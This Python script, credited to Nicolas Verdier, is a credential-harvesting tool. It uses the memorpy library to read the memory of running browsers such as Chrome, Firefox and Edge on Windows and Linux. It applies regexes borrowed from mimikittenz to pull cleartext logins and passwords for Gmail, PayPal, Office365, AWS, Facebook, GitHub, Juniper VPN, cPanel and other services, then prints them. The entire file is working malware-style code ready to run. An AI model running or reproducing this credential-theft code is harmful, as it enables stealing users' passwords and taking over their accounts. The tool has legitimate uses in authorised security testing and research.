#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Author: Nicolas VERDIER (contact@n1nj4.eu)

""" 
This script uses memorpy to dumps cleartext passwords from browser's memory
It has been tested on both windows 10 and ubuntu 16.04
The regex have been taken from the mimikittenz https://github.com/putterpanda/mimikittenz
"""

from memorpy import *
import time

#from https://github.com/putterpanda/mimikittenz
mimikittenz_regex=[
    ("Gmail","&Email=(?P<Login>.{1,99})?&Passwd=(?P<Password>.{1,99})?&PersistentCookie="),
    ("Dropbox","login_email=(?P<Login>.{1,99})&login_password=(?P<Password>.{1,99})&"),
    ("SalesForce","&display=page&username=(?P<Login>.{1,32})&pw=(?P<Password>.{1,16})&Login="),
    ("Office365","login=(?P<Login>.{1,32})&passwd=(?P<Password>.{1,22})&PPSX="),
    ("MicrosoftOneDrive","login=(?P<Login>.{1,42})&passwd=(?P<Password>.{1,22})&type=.{1,2}&PPFT="),
    ("PayPal","login_email=(?P<Login>.{1,48})&login_password=(?P<Password>.{1,16})&submit=Log\+In&browser_name"),
    ("awsWebServices","&email=(?P<Login>.{1,48})&create=.{1,2}&password=(?P<Password>.{1,22})&metadata1="),
    ("OutlookWeb","&username=(?P<Login>.{1,48})&password=(?P<Password>.{1,48})&passwordText"),
    ("Slack","&crumb=.{1,70}&email=(?P<Login>.{1,50})&password=(?P<Password>.{1,48})"),
    ("CitrixOnline","emailAddress=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&submit"),
    ("Xero ","fragment=&userName=(?P<Login>.{1,32})&password=(?P<Password>.{1,22})&__RequestVerificationToken="),
    ("MYOB","UserName=(?P<Login>.{1,50})&Password=(?P<Password>.{1,50})&RememberMe="),
    ("JuniperSSLVPN","tz_offset=-.{1,6}&username=(?P<Login>.{1,22})&password=(?P<Password>.{1,22})&realm=.{1,22}&btnSubmit="),
    ("Twitter","username_or_email%5D=(?P<Login>.{1,42})&session%5Bpassword%5D=(?P<Password>.{1,22})&remember_me="),
    ("Facebook","lsd=.{1,10}&email=(?P<Login>.{1,42})&pass=(?P<Password>.{1,22})&(?:default_)?persistent="),
    ("LinkedIN","session_key=(?P<Login>.{1,50})&session_password=(?P<Password>.{1,50})&isJsEnabled"),
    ("Malwr","&username=(?P<Login>.{1,32})&password=(?P<Password>.{1,22})&next="),
    ("VirusTotal","password=(?P<Password>.{1,22})&username=(?P<Login>.{1,42})&next=%2Fen%2F&response_format=json"),
    ("AnubisLabs","username=(?P<Login>.{1,42})&password=(?P<Password>.{1,22})&login=login"),
    ("CitrixNetScaler","login=(?P<Login>.{1,22})&passwd=(?P<Password>.{1,42})"),
    ("RDPWeb","DomainUserName=(?P<Login>.{1,52})&UserPass=(?P<Password>.{1,42})&MachineType"),
    ("JIRA","username=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&rememberMe"),
    ("Redmine","username=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&login=Login"),
    ("Github","%3D%3D&login=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})"),
    ("BugZilla","Bugzilla_login=(?P<Login>.{1,50})&Bugzilla_password=(?P<Password>.{1,50})"),
    ("Zendesk","user%5Bemail%5D=(?P<Login>.{1,50})&user%5Bpassword%5D=(?P<Password>.{1,50})"),
    ("Cpanel","user=(?P<Login>.{1,50})&pass=(?P<Password>.{1,50})"),
]

if sys.platform=="win32":
    browser_list=["iexplore.exe", "firefox.exe", "chrome.exe", "opera.exe", "MicrosoftEdge.exe", "microsoftedgecp.exe"]
else:
    browser_list=["firefox", "iceweasel", "chromium", "chrome"]
    
def dump_browser_passwords():
    start_time=time.time()
    for process in Process.list():
        if process.get('name') in browser_list:
            try:
                mw = MemWorker(pid=process.get('pid'))
            except ProcessException:
                continue
            
            print 'dumping passwords from %s (pid: %s) ...' % (process.get('name'), str(process.get('pid')))
            for service, x in mw.mem_search(mimikittenz_regex, ftype='groups'):
                print '[+] Software: %s' % service
                print '[+] Login: %s' % x[0]
                print '[+] Password: %s\n' % x[1]

    print "All passwords dumped in %ss"%(time.time()-start_time)


if __name__=="__main__":
    dump_browser_passwords()

